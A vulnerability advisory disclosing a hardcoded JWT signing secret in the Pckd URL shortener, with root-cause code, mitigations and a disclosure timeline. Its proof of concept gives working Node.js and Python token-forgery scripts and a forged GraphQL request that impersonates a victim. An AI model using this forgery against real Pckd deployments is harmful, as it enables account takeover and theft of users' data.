# Security Advisory: Authentication Bypass & User Impersonation via Hardcoded JWT Signing Secret in Just-Moh-it/Pckd

- **Advisory ID**: SEC-ADV-2026-001
- **VulnCheck CVD Submission ID**: `cea3fc14-c26c-45ba-8924-618403809b59`
- **Published**: September 27, 2026
- **Researcher / Discoverer**: Miraziz Kuchkarov (VOID) (vazzzy.071@gmail.com / GitHub: [@vazzzy071-crypto](https://github.com/vazzzy071-crypto))
- **Status**: Public Reference for CVE Assignment (Upstream Archived)

---

## 1. Summary

A critical authentication flaw exists in **Pckd** (developed by **Just-Moh-it**), an open-source URL shortener with over 800 GitHub stars. The official container deployment configuration (`docker-compose.yml`) commits a static, hardcoded JWT signing secret (`JWT_SECRET=verysecurestring`). 

Because incoming GraphQL operations authenticate callers by verifying JWT signatures against `process.env.JWT_SECRET`, an unauthenticated remote attacker can forge valid JSON Web Tokens for any victim `userId`. This enables complete account takeover, unauthorized link creation, access to private user data, and full exfiltration of URL analytics without knowing the victim's credentials.

---

## 2. Affected Software & Supplier Details

- **Impacted Supplier / Vendor**: `Just-Moh-it` (Mohit Yadav)
- **Impacted Product**: `Pckd` ("Not just a URL Shortener")
- **Repository**: [https://github.com/Just-Moh-it/Pckd](https://github.com/Just-Moh-it/Pckd) (Officially Archived)
- **Affected Component(s)**:
  - Deployment configuration: `docker-compose.yml` (line 13)
  - GraphQL Authentication Middleware: `server/src/utils/auth.js` (lines 4–8)
  - Token Minting: `server/src/api/User/signup/signup.js` and `server/src/api/User/login/login.js`
- **Affected Version(s)**: All versions; verified on commit `4e6b606101513545f979a4c2ff5926cf20f49d19` (repo HEAD / v1.0.0 in `package.json`).
- **Fixed Version**: None (Repository is archived).

---

## 3. Vulnerability Classification & Metrics

- **Vulnerability Type**: Authentication Bypass via Hardcoded Cryptographic Key
- **Primary Weakness**: [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- **Secondary Weakness**: [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **CVSS v3.1 Base Score**: **8.1 (High)**
  - Attack Vector: Network (`AV:N`)
  - Attack Complexity: Low (`AC:L`)
  - Privileges Required: None (`PR:N`)
  - User Interaction: None (`UI:N`)
  - Scope: Unchanged (`S:U`)
  - Confidentiality: High (`C:H`)
  - Integrity: Low (`I:L`)
  - Availability: None (`A:N`)

---

## 4. Root Cause Analysis

### 4.1 Hardcoded Secret in Deployment Configuration
In the root `docker-compose.yml` (line 13), Pckd provides the following default environment configuration:
```yaml
environment:
  - DATABASE_URL=postgresql://postgres:postgres@db/pckd
  - DATABASE_TYPE=postgres
  - JWT_SECRET=verysecurestring        # <-- Static, hardcoded signing secret
  - IPREGISTRY_API_KEY=f1ntkcjoqaazglj7
```

### 4.2 Insecure Token Verification
In `server/src/utils/auth.js`:
```javascript
exports.getUserId = (ctx, throwErrors = true) => {
  const token = ctx.request.get("Authorization");
  if (token) {
    const { userId } = jwt.verify(token, process.env.JWT_SECRET);
    return userId;
  }
  if (throwErrors) throw new AuthenticationError("Not Authorised");
  return null;
};
```
The middleware directly verifies the token signature against `process.env.JWT_SECRET`. Since default installations retain `verysecurestring`, any signature generated with this secret is treated as trusted.

### 4.3 Missing Expiration Claims
Furthermore, token generation functions in `server/src/api/User/signup/signup.js` and `login.js` invoke `jwt.sign(payload, process.env.JWT_SECRET)` without specifying an `expiresIn` parameter. As a result, forged tokens never expire.

---

## 5. Proof of Concept (PoC)

### 5.1 Token Forgery Script (Node.js)
```javascript
import crypto from 'crypto';

const secret = 'verysecurestring';
const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
const payload = Buffer.from(JSON.stringify({ userId: 'cmta2smq50052c4vsootzff6a' })).toString('base64url');
const signature = crypto.createHmac('sha256', secret).update(`${header}.${payload}`).digest('base64url');

const forgedJwt = `${header}.${payload}.${signature}`;
console.log('Forged JWT:', forgedJwt);
```

### 5.2 Python Reproduction
```python
import jwt

SECRET = "verysecurestring"
victim_user_id = "cmta2smq50052c4vsootzff6a"

forged_token = jwt.encode({"userId": victim_user_id}, SECRET, algorithm="HS256")
print(f"Authorization: {forged_token}")
```

### 5.3 Sending the Authenticated Request
An attacker transmits the forged token in the `Authorization` header to `/graphql`:

```http
POST /graphql HTTP/1.1
Host: target-pckd.local:4000
Content-Type: application/json
Authorization: <FORGED_TOKEN>

{
  "query": "query { getUserInfo { id name email } getAllPckds { pckd target title enableTracking } }"
}
```

### 5.4 Verified Server Response
```json
{
  "data": {
    "getUserInfo": {
      "id": "cmta2smq50052c4vsootzff6a",
      "name": "Victim User",
      "email": "victim@example.com"
    },
    "getAllPckds": [
      {
        "pckd": "dkhwzl5",
        "target": "https://internal-portal.example/confidential",
        "title": "confidential-link",
        "enableTracking": true
      }
    ]
  }
}
```

---

## 6. Impact

- **Account Takeover**: Full impersonation of any user or administrator whose `userId` is known or enumerated.
- **Data Exfiltration**: Access to sensitive shortened URLs, destination URLs, user profiles, and visitor analytics.
- **Phishing & Malicious Redirection**: Creation of trusted shortlinks using the victim's domain and identity.
- **Indefinite Persistence**: Tokens lack expiration dates and cannot be revoked without changing the master secret.

---

## 7. Remediation & Mitigations

Since `Just-Moh-it/Pckd` is archived, users running existing deployments must apply the following mitigations:

1. **Change Default Secrets**: Immediately generate a cryptographically strong, random 256-bit string for `JWT_SECRET` in `.env` or `docker-compose.yml`.
   ```bash
   openssl rand -hex 32
   ```
2. **Add Expiration**: Update token generation calls to enforce short expiration periods:
   ```javascript
   jwt.sign({ userId }, process.env.JWT_SECRET, { expiresIn: '7d' });
   ```
3. **Startup Validation**: Introduce an environment check during application bootstrap to prevent the server from starting if `JWT_SECRET === 'verysecurestring'`.

---

## 8. Coordinated Disclosure Timeline & Credit

- **Discoverer / Credit**: **Miraziz Kuchkarov (VOID)** (vazzzy.071@gmail.com / GitHub: [@vazzzy071-crypto](https://github.com/vazzzy071-crypto))
- **2026-08-26**: Vulnerability identified and verified on local deployment.
- **2026-09-17 15:06 UTC**: Coordinated Vulnerability Disclosure (CVD) report submitted to VulnCheck CNA (Submission ID: `cea3fc14-c26c-45ba-8924-618403809b59`).
- **2026-09-25 01:20 UTC**: VulnCheck confirmed finding is a valid security primitive eligible for CVE assignment, requesting a public reference due to the repository being archived.
- **2026-09-27**: Public security advisory published to provide the required public reference for CVE publication.

---

## 9. References

- Repository: `https://github.com/Just-Moh-it/Pckd`
- VulnCheck CVD Tracking: `cea3fc14-c26c-45ba-8924-618403809b59`
- CWE-798: [https://cwe.mitre.org/data/definitions/798.html](https://cwe.mitre.org/data/definitions/798.html)
- CWE-287: [https://cwe.mitre.org/data/definitions/287.html](https://cwe.mitre.org/data/definitions/287.html)
